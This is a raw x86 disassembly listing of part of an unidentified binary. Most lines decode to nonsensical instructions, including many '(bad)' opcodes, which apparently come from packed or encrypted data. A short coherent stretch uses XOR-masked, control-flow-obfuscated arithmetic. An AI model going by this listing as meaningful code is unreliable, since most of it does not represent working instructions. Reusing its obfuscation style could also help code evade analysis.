  411399:	cmp    BYTE PTR [ebp-0x467a9ff9],ch
  41139f:	xchg   edi,eax
  4113a0:	add    BYTE PTR [ecx-0x27],cl
  4113a3:	add    ecx,DWORD PTR [esi-0x79222aad]
  4113a9:	imul   esp,DWORD PTR [esi-0x6a],0x76
  4113ad:	scas   eax,DWORD PTR es:[edi]
  4113ae:	div    BYTE PTR [ecx]
  4113b0:	push   edi
  4113b1:	mov    edi,cs
  4113b3:	scas   eax,DWORD PTR es:[edi]
  4113b4:	(bad)  
  4113b5:	aas    
  4113b6:	mov    al,0x1e
  4113b8:	cld    
  4113b9:	adc    BYTE PTR [ebx],bh
  4113bb:	cmp    al,0xde
  4113bd:	call   0xd309f2c8
  4113c2:	ins    DWORD PTR es:[edi],dx
  4113c3:	mov    edi,0x28bbc3b1
  4113c8:	in     al,0x92
  4113ca:	retf   
  4113cb:	adc    eax,0xd4385742
  4113d0:	loope  0x411422
  4113d2:	xor    DWORD PTR [ebx-0xc],eax
  4113d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113d6:	ss inc ebp
  4113d8:	push   ecx
  4113d9:	or     dl,BYTE PTR [ecx+ebp*2+0x45]
  4113dd:	add    al,0xfe
  4113df:	jle    0x411418
  4113e1:	sub    edi,esp
  4113e3:	icebp  
  4113e4:	jb     0x41141a
  4113e6:	inc    ecx
  4113e7:	xor    al,0x60
  4113e9:	scas   eax,DWORD PTR es:[edi]
  4113ea:	mov    eax,0x5f26598a
  4113ef:	out    0xd2,eax
  4113f1:	mov    dl,0xc0
  4113f3:	xor    al,0x96
  4113f5:	inc    ebp
  4113f6:	sbb    al,0x0
  4113f8:	sbb    eax,0xdcc1c8f1
  4113fd:	xchg   BYTE PTR [ecx+eax*4],bh
  411400:	xor    DWORD PTR [esi+ecx*8+0x65],0xc44c08e7
  411408:	loop   0x4113c2
  41140a:	or     eax,0x2e49dc4f
  41140f:	aaa    
  411410:	xor    cl,BYTE PTR [eax+0x12]
  411413:	mov    edi,DWORD PTR [esi]
  411415:	(bad)  
  411416:	outs   dx,DWORD PTR ds:[esi]
  411417:	xor    al,0x78
  411419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41141a:	jae    0x41140a
  41141c:	test   al,0x5
  41141e:	inc    esi
  41141f:	push   ds
  411420:	fst    st(4)
  411422:	xchg   BYTE PTR [ebx-0x2a727096],ah
  411428:	dec    edx
  411429:	pop    ecx
  41142a:	jge    0x4113be
  41142c:	lock push 0x38
  41142f:	mov    dh,0xdb
  411431:	or     dl,BYTE PTR [esi-0x5e]
  411434:	dec    ecx
  411435:	stc    
  411436:	xchg   BYTE PTR [eax+0x4bf38ea7],cl
  41143c:	or     DWORD PTR [bx],eax
  41143f:	jecxz  0x4114a9
  411441:	or     DWORD PTR [esi-0x2a6b38e1],ebp
  411447:	push   0x33
  411449:	or     al,0x97
  41144b:	les    edx,FWORD PTR fs:[ebx]
  41144e:	fiadd  DWORD PTR [ebp-0x22]
  411451:	mov    cl,0xb6
  411453:	push   es
  411454:	push   cs
  411455:	retf   
  411456:	fadd   st(6),st
  411458:	jmp    FWORD PTR [edx-0x638efd27]
  41145e:	fs jle 0x4114c2
  411461:	pop    ss
  411462:	imul   ebx,DWORD PTR [ecx],0x745f49b2
  411468:	outs   dx,BYTE PTR ds:[esi]
  411469:	adc    BYTE PTR [ecx+0x6943cd16],ch
  41146f:	or     ch,BYTE PTR [edx+0x56c236f5]
  411475:	and    edi,DWORD PTR ds:[edi*1+0x65dc22b3]
  41147d:	dec    edx
  41147e:	scas   eax,DWORD PTR es:[edi]
  41147f:	dec    ebx
  411480:	xchg   edx,eax
  411481:	loopne 0x4114b6
  411483:	stc    
  411484:	xchg   ebx,eax
  411485:	adc    DWORD PTR [ecx+0x5e538787],edx
  41148b:	das    
  41148c:	mov    bh,0x1
  41148e:	dec    ebx
  41148f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411491:	into   
  411492:	xor    BYTE PTR ds:0x999d2b60,bl
  411498:	daa    
  411499:	mov    eax,0xcc98222f
  41149e:	in     eax,dx
  41149f:	cwde   
  4114a0:	stos   BYTE PTR es:[edi],al
  4114a1:	ret    0x7751
  4114a4:	cmc    
  4114a5:	push   es
  4114a6:	lock jns 0x411514
  4114a9:	xchg   edx,eax
  4114aa:	push   esp
  4114ab:	(bad)  
  4114ac:	es jne 0x411455
  4114af:	ss int3 
  4114b1:	or     al,0x36
  4114b3:	or     DWORD PTR [ebp-0x550a79d8],edx
  4114b9:	pop    eax
  4114ba:	or     dh,ch
  4114bc:	sub    dh,BYTE PTR [edx+0x47]
  4114bf:	xchg   ecx,eax
  4114c0:	fcom   st(3)
  4114c2:	ss fwait
  4114c4:	inc    ecx
  4114c5:	sub    al,0xe3
  4114c7:	fild   DWORD PTR [esi+ecx*1]
  4114ca:	call   0xa58c9da7
  4114cf:	pop    esi
  4114d0:	adc    dl,dh
  4114d2:	test   eax,0xedda43cb
  4114d7:	dec    ebp
  4114d8:	xor    dl,dl
  4114da:	cmp    ebx,DWORD PTR [edi+0x24]
  4114dd:	outs   dx,DWORD PTR ds:[esi]
  4114de:	lahf   
  4114df:	call   0x7cf6e9a6
  4114e4:	and    al,0xd3
  4114e6:	lods   eax,DWORD PTR ds:[esi]
  4114e7:	ss or  ch,bl
  4114ea:	cs icebp 
  4114ec:	jae    0x411486
  4114ee:	dec    ebx
  4114ef:	jb     0x41149d
  4114f1:	outs   dx,DWORD PTR ds:[esi]
  4114f2:	fwait
  4114f3:	repz dec ebp
  4114f5:	or     esi,DWORD PTR [esi+0x65]
  4114f8:	adc    DWORD PTR cs:[ecx-0x3b],ebx
  4114fc:	mov    edx,esi
  4114fe:	or     bh,dl
  411500:	stos   DWORD PTR es:[edi],eax
  411501:	jle    0x4114e2
  411503:	mov    edx,0xb605d9f
  411508:	or     cl,BYTE PTR [edi+0x64823d6a]
  41150e:	fsubr  DWORD PTR ds:0xa4efd88
  411514:	mov    al,ds:0x98dde7b6
  411519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41151a:	retf   
  41151b:	pop    ss
  41151c:	xor    DWORD PTR [edi],ebp
  41151e:	push   esp
  41151f:	jecxz  0x411508
  411521:	cmp    BYTE PTR fs:[ebp-0x21],0x6a
  411526:	cmp    eax,0x639b52a6
  41152b:	(bad)  
  41152c:	xchg   ebx,eax
  41152d:	push   0x70e8773f
  411532:	dec    edi
  411533:	inc    esp
  411534:	out    dx,eax
  411535:	sti    
  411536:	dec    edi
  411537:	xchg   BYTE PTR [edi+0x7b9a605a],bl
  41153d:	push   ecx
  41153e:	mov    DWORD PTR [ebx+ecx*8+0x5fce6c2],esp
  411545:	inc    edx
  411546:	cli    
  411547:	adc    ah,BYTE PTR [edx+0x1d]
  41154a:	add    BYTE PTR [eax-0x21],bh
  41154d:	or     DWORD PTR [edx+0x1d],esp
  411550:	mov    ah,bh
  411552:	syscall 
  411554:	imul   ebp,esp,0x110bb041
  41155a:	push   edi
  41155b:	inc    esp
  41155c:	or     eax,0x57c27ae7
  411561:	xchg   ecx,eax
  411562:	pop    edx
  411563:	adc    DWORD PTR ds:0xe7a68ed4,esi
  411569:	jmp    0x3b9b461a
  41156e:	adc    eax,0x74b163b9
  411573:	repnz stos BYTE PTR es:[edi],al
  411575:	inc    ebx
  411576:	mov    eax,ds:0x2b67ba87
  41157b:	call   DWORD PTR [edx-0x5f]
  41157e:	and    eax,0xe434d5d8
  411583:	add    al,0x37
  411585:	cmp    edi,0xb3253a23
  41158b:	jecxz  0x411521
  41158d:	retf   
  41158e:	in     eax,dx
  41158f:	or     al,0x97
  411591:	adc    al,0x8
  411593:	mov    dl,BYTE PTR [esi+0x47]
  411596:	stos   BYTE PTR es:[edi],al
  411597:	cmp    al,0xac
  411599:	and    ebx,DWORD PTR [ecx-0x24]
  41159c:	(bad)  
  41159e:	cmp    DWORD PTR es:[edi-0xf],ebp
  4115a2:	sub    al,0x94
  4115a4:	loopne 0x411531
  4115a6:	stos   BYTE PTR es:[edi],al
  4115a7:	and    al,0x1
  4115a9:	loope  0x411551
  4115ab:	push   cs
  4115ac:	int    0x3d
  4115ae:	ja     0x411531
  4115b0:	mov    al,0x91
  4115b2:	push   esi
  4115b3:	enter  0x2d41,0xdf
  4115b7:	outs   dx,DWORD PTR ds:[esi]
  4115b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115b9:	mov    al,0x42
  4115bb:	push   eax
  4115bc:	cmp    ah,dh
  4115be:	pop    ss
  4115bf:	inc    edi
  4115c0:	mov    es:0x821d90dc,eax
  4115c6:	addr16 int 0xdf
  4115c9:	cmp    ebp,DWORD PTR [edx+0x53]
  4115cc:	pop    eax
  4115cd:	je     0x411593
  4115cf:	jno    0x41158f
  4115d1:	cmp    DWORD PTR [edi],ebp
  4115d3:	scas   al,BYTE PTR es:[edi]
  4115d4:	retf   
  4115d5:	mov    esp,0x21bf00a3
  4115da:	test   dh,al
  4115dc:	push   0xffffff8b
  4115de:	es add eax,ebx
  4115e1:	and    ah,BYTE PTR [eax-0x7c618fef]
  4115e7:	in     al,0xd
  4115e9:	or     al,ch
  4115eb:	daa    
  4115ec:	mov    ebp,0x56f8540c
  4115f1:	or     eax,0x6e4575a7
  4115f6:	sbb    ecx,eax
  4115f8:	ja     0x41160a
  4115fa:	inc    esi
  4115fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115fc:	inc    ebp
  4115fd:	es ins DWORD PTR es:[edi],dx
  4115ff:	adc    esi,DWORD PTR [esi+0x4]
  411602:	aad    0xe8
  411604:	jp     0x4115d3
  411606:	cwde   
  411607:	add    al,dh
  411609:	mov    al,ds:0xbfe7135b
  41160e:	fisub  DWORD PTR [eax]
  411610:	inc    esi
  411611:	out    0x61,al
  411613:	ret    
  411614:	loopne 0x4115c0
  411616:	push   cs
  411617:	mov    ds:0x82df0a98,al
  41161c:	push   ds
  41161d:	jmp    0x77b:0x8f22f1af
  411624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411625:	push   0xcb526a4
  41162a:	xor    BYTE PTR [edx+0xf],0x7e
  41162e:	fld    st(1)
  411630:	push   ds
  411631:	out    dx,al
  411632:	imul   ecx,edi,0x3e
  411635:	mov    ds:0x474d918c,al
  41163a:	test   eax,0x96fe39be
  41163f:	pop    es
  411640:	(bad)  
  411641:	cmc    
  411642:	cmp    BYTE PTR [eax-0x462b738d],cl
  411648:	inc    ebx
  411649:	inc    esp
  41164a:	cld    
  41164b:	out    dx,al
  41164c:	arpl   WORD PTR [ecx-0x65],cx
  41164f:	xlat   BYTE PTR ds:[ebx]
  411650:	sahf   
  411651:	add    ch,al
  411653:	std    
  411654:	out    dx,al
  411655:	xchg   esi,ecx
  411657:	std    
  411658:	push   eax
  411659:	(bad)  
  41165a:	scas   eax,DWORD PTR es:[edi]
  41165b:	jbe    0x411653
  41165d:	mov    eax,0xc39afa93
  411662:	inc    ecx
  411663:	ret    0x42d8
  411666:	sbb    BYTE PTR [ecx],0xc9
  411669:	or     dl,0x56
  41166c:	enter  0x5296,0x66
  411670:	push   ebp
  411671:	inc    esp
  411672:	neg    BYTE PTR [esi+eiz*2+0x68047e1]
  411679:	sbb    esi,DWORD PTR [edi+0x3d]
  41167c:	and    dl,BYTE PTR [ebp-0x38]
  41167f:	pop    eax
  411680:	mov    bl,0xb7
  411682:	arpl   WORD PTR [edx-0x50609ac1],ax
  411688:	xchg   BYTE PTR [eax+0x1f],al
  41168b:	jl     0x4116f0
  41168d:	fidivr DWORD PTR [esi+0x2c2b066c]
  411693:	dec    ecx
  411694:	iret   
  411695:	(bad)  
  411697:	loop   0x41169d
  411699:	cmp    al,0x6a
  41169b:	test   ch,bl
  41169d:	mov    ecx,0x4c682bda
  4116a2:	lahf   
  4116a3:	inc    esi
  4116a4:	mov    esp,DWORD PTR [ebx]
  4116a6:	enter  0x76fe,0xd8
  4116aa:	inc    ebx
  4116ab:	jmp    0x961c:0xa3fbec6c
  4116b2:	xor    ch,BYTE PTR [esi+ecx*2+0x146c9b9c]
  4116b9:	cwde   
  4116ba:	push   ecx
  4116bb:	mov    al,0x40
  4116bd:	push   ebx
  4116be:	fwait
  4116bf:	or     bh,bh
  4116c1:	pop    edx
  4116c2:	add    ebx,DWORD PTR [eax]
  4116c4:	je     0x411648
  4116c6:	mov    edx,0x59a08e4f
  4116cb:	imul   ecx,DWORD PTR [ecx+eiz*8-0x41],0xe42ce6e7
  4116d3:	das    
  4116d4:	add    dh,ah
  4116d6:	xchg   esp,eax
  4116d7:	dec    esi
  4116d8:	adc    eax,0xee17f342
  4116dd:	aas    
  4116de:	retf   0x1de7
  4116e1:	sub    cl,bh
  4116e3:	push   ds
  4116e4:	mov    ds:0x5b376d81,al
  4116e9:	xchg   ecx,eax
  4116ea:	loope  0x4116a1
  4116ec:	arpl   WORD PTR [ecx+0x12247c43],bx
  4116f2:	hlt    
  4116f3:	pop    edx
  4116f4:	loop   0x41172a
  4116f6:	push   edx
  4116f7:	jmp    0x1e8c2114
  4116fc:	cwde   
  4116fd:	sbb    ecx,DWORD PTR [edi+0x1030ef52]
  411703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411704:	sub    BYTE PTR [eax+0x6b6fb07b],bl
  41170a:	int3   
  41170b:	dec    ebx
  41170c:	lock push cs
  41170e:	or     ebp,DWORD PTR [ebp+0x11456afb]
  411714:	retf   
  411715:	push   ebx
  411716:	mov    al,ds:0x2da61415
  41171b:	mov    cl,BYTE PTR [edx+0x76]
  41171e:	ss or  eax,0xf531c398
  411724:	mov    al,0xe2
  411726:	(bad)  
  411729:	fld    st(6)
  41172b:	lods   al,BYTE PTR ds:[esi]
  41172c:	push   ecx
  41172d:	sub    edx,eax
  41172f:	dec    edx
  411730:	sbb    edx,esp
  411732:	or     DWORD PTR [ebx],ecx
  411734:	fs ja  0x41172f
  411737:	dec    ebx
  411738:	cmp    BYTE PTR [edx],0xe3
  41173b:	mov    eax,ds:0x6ac12fbf
  411740:	or     DWORD PTR [esi-0x5099f7c9],ecx
  411746:	fstp   QWORD PTR [edi+0x27]
  411749:	add    cl,ah
  41174b:	or     al,0x1f
  41174d:	sub    al,0xdf
  41174f:	nop
  411750:	test   al,0x3b
  411752:	sub    eax,0xa5ed00d5
  411757:	stc    
  411758:	dec    eax
  411759:	ins    BYTE PTR es:[edi],dx
  41175a:	adc    BYTE PTR [eax+0x31],bl
  41175d:	xchg   ebp,eax
  41175e:	cmp    eax,DWORD PTR [esi+0x1d]
  411761:	imul   eax,DWORD PTR [ebx+0x669a5937],0x5e
  411768:	and    DWORD PTR [esi],ebx
  41176a:	add    eax,0x28a03820
  41176f:	int    0x15
  411771:	cmp    al,BYTE PTR [edx]
  411773:	push   ecx
  411774:	mov    esp,0x96d83dd7
  411779:	mov    dh,0x9c
  41177b:	lds    edi,FWORD PTR [ebx-0x5989f28c]
  411781:	stc    
  411782:	or     bh,BYTE PTR [ecx+0x65]
  411785:	imul   ecx,DWORD PTR ds:0xc2c4adb6,0x629fad0b
  41178f:	mov    ds:0xc00bab46,al
  411794:	cmp    ch,0x5a
  411797:	out    dx,eax
  411798:	pop    ebp
  411799:	mov    esp,0x58cd0c8f
  41179e:	stos   DWORD PTR es:[edi],eax
  41179f:	pop    ecx
  4117a0:	test   al,0xc1
  4117a2:	ins    BYTE PTR es:[edi],dx
  4117a3:	fimul  WORD PTR [eax-0x7669161c]
  4117a9:	jnp    0x4117fb
  4117ab:	shl    DWORD PTR [eax],cl
  4117ad:	inc    edi
  4117ae:	sub    BYTE PTR [esi],al
  4117b0:	add    eax,0x7752c36
  4117b5:	xor    eax,0x5afc7a78
  4117ba:	lahf   
  4117bb:	rcl    BYTE PTR [edi],cl
  4117bd:	jnp    0x411833
  4117bf:	cmp    eax,0x351d9bd3
  4117c4:	sub    dl,ch
  4117c6:	fiadd  DWORD PTR [esi]
  4117c8:	xor    edx,DWORD PTR [edx-0x6ade7a05]
  4117ce:	inc    edi
  4117cf:	call   0xcdfdb4bc
  4117d4:	push   ebx
  4117d5:	xor    DWORD PTR [edi+0x54722283],esi
  4117db:	daa    
  4117dc:	ret    0xd3fc
  4117df:	out    dx,al
  4117e0:	daa    
  4117e1:	scas   al,BYTE PTR es:[edi]
  4117e2:	sahf   
  4117e3:	pop    ss
  4117e4:	test   al,0xaf
  4117e6:	jmp    0x41181c
  4117e8:	das    
  4117e9:	xchg   ebx,eax
  4117ea:	xchg   al,bl
  4117ec:	or     BYTE PTR [esi+0x2b],ch
  4117ef:	into   
  4117f0:	xor    ecx,eax
  4117f2:	mov    DWORD PTR [ebp+0x8],ecx
  4117f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4117f8:	mov    edx,DWORD PTR [ebp+0x8]
  4117fb:	imul   edx,edx,0x5708f1
  411801:	xor    ecx,eax
  411803:	add    ecx,esi
  411805:	lea    ecx,[ebp+ecx*4-0x64]
  411809:	mov    edi,DWORD PTR [ecx]
  41180b:	add    edx,edi
  41180d:	mov    DWORD PTR [ecx],edx
  41180f:	mov    ecx,DWORD PTR [ebp+0x8]
  411812:	xor    ecx,eax
  411814:	add    ecx,esi
  411816:	jne    0x40f45a
  41181c:	jmp    0x413bef
  411821:	mov    ecx,DWORD PTR [ebp+0x8]
  411824:	mov    edx,DWORD PTR [ebp-0x8]
  411827:	xor    ecx,eax
  411829:	xor    edx,eax
  41182b:	sub    ecx,edx
  41182d:	sub    ecx,esi
  41182f:	xor    ecx,eax
  411831:	mov    DWORD PTR [ebp+0x8],ecx
  411834:	mov    ecx,DWORD PTR [ebp+0x8]
  411837:	mov    edx,DWORD PTR [ebp+0x8]
  41183a:	xor    ecx,eax
  41183c:	imul   edx,edx,0x5708f1
  411842:	add    ecx,esi
  411844:	lea    ecx,[ebp+ecx*4-0x64]
  411848:	mov    edi,DWORD PTR [ecx]
  41184a:	add    edx,edi
  41184c:	mov    DWORD PTR [ecx],edx
  41184e:	mov    ecx,DWORD PTR [ebp+0x8]
  411851:	xor    ecx,eax
  411853:	add    ecx,esi
  411855:	jne    0x411821
  41185b:	jmp    0x413be3
  411860:	ins    BYTE PTR es:[edi],dx
  411861:	jns    0x4117f2
  411863:	sbb    edi,DWORD PTR [ebx+0x1b]
  411866:	mov    eax,0xa6df667b
  41186b:	push   edi
  41186c:	cmp    BYTE PTR [ecx-0x6f17d182],bl
  411872:	jl     0x4118f0
  411874:	pop    es
  411875:	pop    edi
  411876:	jl     0x4118f4
  411878:	idiv   DWORD PTR [ecx-0x4523d61f]
  41187e:	add    al,0x20
  411880:	adc    DWORD PTR [ebx-0x148aedaa],ebp
  411886:	mov    bh,0xce
  411888:	pop    ebx
  411889:	xor    DWORD PTR [esi+0x29c339f4],edi
  41188f:	jo     0x411849
  411891:	push   ebx
  411892:	pop    edi
  411893:	inc    esi
  411894:	adc    DWORD PTR [esp+edi*1-0x4609d1c],edi
  41189b:	dec    edx
  41189c:	cli    
  41189d:	(bad)  
  41189f:	jbe    0x4118eb
  4118a1:	xchg   esi,eax
  4118a2:	sahf   
  4118a3:	mov    dh,0x56
  4118a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118a7:	mov    ds:0xe02914af,eax
  4118ac:	sbb    eax,0x5d643370
  4118b1:	ret    
  4118b2:	mov    bl,0xc7
  4118b4:	mov    edi,0xb949683
  4118b9:	fistp  WORD PTR [eax-0x7]
  4118bc:	test   DWORD PTR [edx],edx
  4118be:	push   0xffffff9c
  4118c0:	scas   al,BYTE PTR es:[edi]
  4118c1:	xor    bh,BYTE PTR [eax]
  4118c3:	imul   esi,DWORD PTR [esi-0x67e16a7c],0x78209994
  4118cd:	adc    edi,DWORD PTR [ebx+edi*1-0x3994c35c]
  4118d4:	adc    dh,BYTE PTR [esi]
  4118d6:	xlat   BYTE PTR ds:[ebx]
  4118d7:	jecxz  0x41187d
  4118d9:	adc    al,0xb5
  4118db:	loopne 0x41188f
  4118dd:	pop    eax
  4118de:	mov    ah,0xee
  4118e0:	scas   eax,DWORD PTR es:[edi]
  4118e1:	mov    esp,0xee5c3e8
  4118e6:	nop
  4118e7:	stos   DWORD PTR es:[edi],eax
  4118e8:	jno    0x411875
  4118ea:	sub    ebx,DWORD PTR [edx]
  4118ec:	loope  0x411905
  4118ee:	mov    al,0x40
  4118f0:	pop    es
  4118f1:	popf   
  4118f2:	std    
  4118f3:	push   0xd9558a23
  4118f8:	pushf  
  4118f9:	adc    dl,ah
  4118fb:	out    dx,eax
  4118fc:	mov    edi,DWORD PTR [eax+0x2f23db5c]
  411902:	jae    0x411891
  411904:	pop    edx
  411905:	test   eax,0x1074243c
  41190a:	sub    ah,BYTE PTR [edx]
  41190c:	xchg   ecx,eax
  41190d:	not    esi
  41190f:	loopne 0x4118bb
  411911:	js     0x411964
  411913:	mov    DWORD PTR [ebx+0x3d720c45],0x431b4d80
  41191d:	repnz mov dh,0x5f
  411920:	mov    WORD PTR [ecx],?
  411922:	sti    
  411923:	pop    es
  411924:	outs   dx,BYTE PTR ds:[esi]
  411925:	mov    ecx,0xdb1064c1
  41192a:	add    dl,ch
  41192c:	jo     0x4118fa
  41192e:	mov    cs,WORD PTR [ebx]
  411930:	(bad)
  411933:	dec    edx
  411934:	sahf   
  411935:	inc    ebx
  411936:	pop    ebx
  411937:	mov    ds:0xf4fefcb3,eax
  41193c:	sub    al,0xa9
  41193e:	xchg   esp,eax
  41193f:	pop    ecx
  411940:	xchg   ebp,eax
  411941:	push   cs
  411942:	cmp    bh,BYTE PTR [ecx]
  411944:	xchg   esi,eax
  411945:	xchg   DWORD PTR [esi],edi
  411947:	sar    DWORD PTR ds:0xa15d3279,cl
  41194d:	push   ss
  41194e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41194f:	fiadd  DWORD PTR [edi]
  411951:	push   ebp
  411952:	push   0xffffffe1
  411954:	and    DWORD PTR [eax+ebp*8+0x5e9de8a2],0x3e8a8cdc
  41195f:	fnsave [edi+ebx*8]
  411962:	mov    dl,0xfd
  411964:	in     al,dx
  411965:	adc    eax,0x49ad03c2
  41196a:	cs jge 0x411998
  41196d:	and    BYTE PTR [ebx],ah
  41196f:	pop    es
  411970:	in     eax,0x3d
  411972:	repz and DWORD PTR [esp+ebp*1+0xa],edi
  411977:	or     ebp,esp
  411979:	mov    ch,0x81
  41197b:	xchg   ebx,eax
  41197c:	lea    eax,[eax]
  41197e:	xor    al,0x27
  411980:	sbb    BYTE PTR [edi-0x3f5245d5],0x55
  411987:	add    edx,0xd4559173
  41198d:	ja     0x4119ea
  41198f:	inc    ecx
  411990:	sub    edx,DWORD PTR [edi-0x6a]
  411993:	push   es
  411994:	sbb    DWORD PTR [eax+ebp*8+0x2ddebe81],0x9f9b304b
  41199f:	ss retf 
  4119a1:	push   0x265066c7
  4119a6:	and    eax,0xbf88ad6e
  4119ab:	pop    ss
  4119ac:	gs (bad) 
  4119ae:	std    
  4119af:	fdiv   QWORD PTR [eax]
  4119b1:	call   0xa7f5:0x68d0c91e
  4119b8:	ds std 
  4119ba:	aas    
  4119bb:	mov    edx,0x85714e97
  4119c0:	and    al,0x50
  4119c2:	adc    al,0x7c
  4119c4:	add    DWORD PTR [esi+0x1b96c357],esi
  4119ca:	cs popfw 
  4119cd:	test   al,0x56
  4119cf:	loop   0x411a18
  4119d1:	int3   
  4119d2:	in     al,dx
  4119d3:	shl    DWORD PTR [eax+eax*4-0xa],0xa3
  4119d8:	inc    esi
  4119d9:	mov    ds:0xa5d5d97,eax
  4119de:	xor    ah,BYTE PTR [eax+0x7e]
  4119e1:	xor    eax,0xee5929ff
  4119e6:	jp     0x411980
  4119e8:	in     eax,dx
  4119e9:	mov    ds:0x9f76482a,al
  4119ee:	and    al,0x3f
  4119f0:	inc    esi
  4119f1:	xchg   edx,eax
  4119f2:	adc    DWORD PTR [eax+0x85ee698],0xffffff9d
  4119f9:	dec    esi
  4119fa:	mov    ebx,DWORD PTR [eax+0x28afe1da]
  411a00:	jle    0x411a56
  411a02:	daa    
  411a03:	gs cwde 
  411a05:	mov    ch,0xe
  411a07:	mov    eax,ds:0xf37b23a3
  411a0c:	sub    dh,0xf3
  411a0f:	int    0x27
  411a11:	sub    BYTE PTR [esi],bh
  411a13:	(bad)  
  411a14:	jmp    0x4119d6
  411a16:	mov    eax,ds:0x799d33e
  411a1b:	(bad)  
  411a1c:	iret   
  411a1d:	jbe    0x411a5f
  411a1f:	push   eax
  411a20:	sbb    eax,DWORD PTR [ecx-0x7e69ae88]
  411a26:	in     al,dx
  411a27:	(bad)  
  411a28:	imul   esi,DWORD PTR [eax-0x29af174f],0xffffff97
  411a2f:	scas   al,BYTE PTR es:[edi]
  411a30:	neg    esi
  411a32:	mov    WORD PTR [ebp+0xc68c226],?
  411a38:	jg     0x411a1b
  411a3a:	aaa    
  411a3b:	fs jge 0x411a71
  411a3e:	or     DWORD PTR [ebx-0xababd9d],ecx
  411a44:	jno    0x411a62
  411a46:	xor    DWORD PTR [edx+0x5711582e],0xba6adecd
  411a50:	pop    ss
  411a51:	mov    esi,0x1e6d0c38
  411a56:	fwait
  411a57:	sbb    dh,dh
  411a59:	fs call 0x81d7:0x2308b75e
  411a61:	mov    eax,0x8ef02f16
  411a66:	loop   0x4119ff
  411a68:	xchg   esp,eax
  411a69:	es call 0xb2546571
  411a6f:	or     BYTE PTR [eax+0x4957eadf],0x86
  411a76:	mov    esp,0x93110286
  411a7b:	push   ebx
  411a7c:	dec    edi
  411a7d:	ins    DWORD PTR es:[edi],dx
  411a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a7f:	jno    0x411aa9
  411a81:	fsub   QWORD PTR [ebx+0x4d]
  411a84:	mov    ds:0x664970b1,al
  411a89:	lea    esp,[edi+ebp*8-0xdca44fd]
  411a90:	push   esp
  411a91:	(bad)  
  411a92:	cmp    al,0x69
  411a94:	fld    st(2)
  411a96:	test   BYTE PTR [esi+0x7c],dl
  411a99:	mov    al,BYTE PTR [edx-0x3bb76df7]
  411a9f:	xchg   esp,eax
  411aa0:	popa   
  411aa1:	mov    ebx,0xe7d67e93
  411aa6:	(bad)  [edx-0x23b50523]
  411aac:	and    eax,0xd5776db
  411ab1:	lahf   
  411ab2:	xchg   edx,eax
  411ab3:	push   esi
  411ab4:	push   edi
  411ab5:	jl     0x411a4b
  411ab7:	dec    edx
  411ab8:	adc    BYTE PTR [edi+0xb],bh
  411abb:	loope  0x411a8c
  411abd:	xor    DWORD PTR [ecx+0x36],ebp
  411ac0:	test   BYTE PTR [ecx-0x7b0c8bfd],dl
  411ac6:	popf   
  411ac7:	mov    DWORD PTR [esi+0x120db646],esp
  411acd:	jbe    0x411a9e
  411acf:	pop    es
  411ad0:	sub    al,0x7f
  411ad2:	mov    eax,0xdb37ab79
  411ad7:	lods   eax,DWORD PTR ds:[esi]
  411ad8:	sub    eax,0x19febc6
  411add:	adc    eax,0x5eb6eaf6
  411ae2:	out    dx,al
  411ae3:	mov    bl,al
  411ae5:	arpl   di,bp
  411ae7:	ret    
  411ae8:	ins    BYTE PTR es:[edi],dx
  411ae9:	inc    ebx
  411aea:	mov    al,ds:0x6b0ad578
  411aef:	cmp    al,0xee
  411af1:	cmp    ebx,eax
  411af3:	mov    ds:0xbf0510df,al
  411af8:	mov    esi,0x858d0ba8
  411afd:	sbb    al,0xd
  411aff:	les    edi,FWORD PTR [edx+0x5e]
  411b02:	rcr    BYTE PTR [ecx],1
  411b04:	mov    dl,0x11
  411b06:	adc    edi,DWORD PTR [esi]
  411b08:	xor    esp,ecx
  411b0a:	mov    ebp,0xc1077297
  411b0f:	lds    ecx,FWORD PTR [esi+0x42658e3b]
  411b15:	jge    0x411a97
  411b17:	and    bl,BYTE PTR [eax-0x44]
  411b1a:	das    
  411b1b:	push   ss
  411b1c:	div    cl
  411b1e:	(bad)  
  411b1f:	lahf   
  411b20:	push   DWORD PTR [esi]
  411b22:	stc    
  411b23:	mov    ebx,0xcbb3046d
  411b28:	popa   
  411b29:	mov    cl,BYTE PTR [edx+0x2d54e3ed]
  411b2f:	dec    esp
  411b30:	jl     0x411b48
  411b32:	shr    DWORD PTR es:[ebp+0x24],cl
  411b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b37:	mov    DWORD PTR [ebx],esi
  411b39:	daa    
  411b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b3c:	pop    ebp
  411b3d:	(bad)  
  411b3e:	xor    eax,0x8b847e9
  411b43:	cmp    DWORD PTR [ecx+0x430241f6],0x6f317082
  411b4d:	xor    al,0x4b
  411b4f:	loope  0x411af5
  411b51:	push   ecx
  411b52:	push   ecx
  411b53:	aas    
  411b54:	inc    esi
  411b55:	jbe    0x411bcb
  411b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b58:	imul   ebp,esi,0xffffffe9
  411b5b:	jge    0x411b15
  411b5d:	mov    bh,0xa6
  411b5f:	or     BYTE PTR [ecx],cl
  411b61:	dec    ebx
  411b62:	sub    eax,0x3b8210f4
  411b67:	mov    eax,0xe7defc73
  411b6c:	jb     0x411b99
  411b6e:	mul    DWORD PTR [ebx-0x70]
  411b71:	aaa    
  411b72:	imul   ecx,DWORD PTR [ebp-0x3940b1a2],0xffffffde
  411b79:	(bad)  
  411b7a:	mov    dl,0x63
  411b7c:	jbe    0x411bad
  411b7e:	fnstenv [bp+si-0x80]
  411b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b83:	dec    esp
